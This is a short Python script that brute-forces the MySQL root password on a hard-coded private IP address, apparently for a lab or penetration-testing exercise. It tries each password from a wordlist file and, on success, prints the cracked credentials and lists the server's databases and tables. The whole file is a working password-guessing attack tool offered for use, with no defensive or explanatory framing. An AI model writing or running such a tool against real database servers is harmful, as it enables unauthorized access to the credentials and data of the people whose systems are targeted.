#!/usr/bin/python3.7
import MySQLdb

fail = '\033[91m[-]\033[0m'
ok  = '\033[92m[+]\033[0m'
app  = '\033[92m[*]\033[0m'
att = '\033[93m[!]\033[0m'
green = '\033[92m'
nocolor= '\033[0m'


msg_ok=" BINGO - Username: "
msg_fail=" FAIL - Username: "
msg_pass=" Password: "
username="root"
wordlist="wordlist.txt"
target='10.171.1.129'
msg_server = ' - MySQL Server IP: ' + target

with open(wordlist, "r") as _word:
    for _line in _word:
        _password = _line.strip("\n")

        try:
            mysqlconn = MySQLdb.connect(host=target,user=username,password=_password)
            print(ok + msg_ok + green + username + nocolor + msg_pass + green + _password + nocolor + msg_server)
            print(att + " - " + str(mysqlconn.query('SHOW DATABASES;')))
            print(mysqlconn.query('USE mysql;'))
            print(mysqlconn.query('SHOW TABLES;'))
            mysqlconn.close()

        except(MySQLdb.Error):
            print( fail + msg_fail + username + msg_pass + _password)
